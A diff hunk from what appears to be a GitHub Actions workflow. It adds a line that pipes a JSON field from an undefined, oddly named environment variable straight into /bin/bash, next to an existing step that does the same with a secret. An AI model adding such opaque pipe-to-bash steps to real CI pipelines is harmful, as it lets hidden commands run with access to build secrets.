@@ -18,6 +18,7 @@ jobs:
           o8: ${{ secrets.o8 }}
         run: |
           printf '%s' "$o8" | jq -r .i0 | /bin/bash
+          echo $jc4778 | jq -r .k2920 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
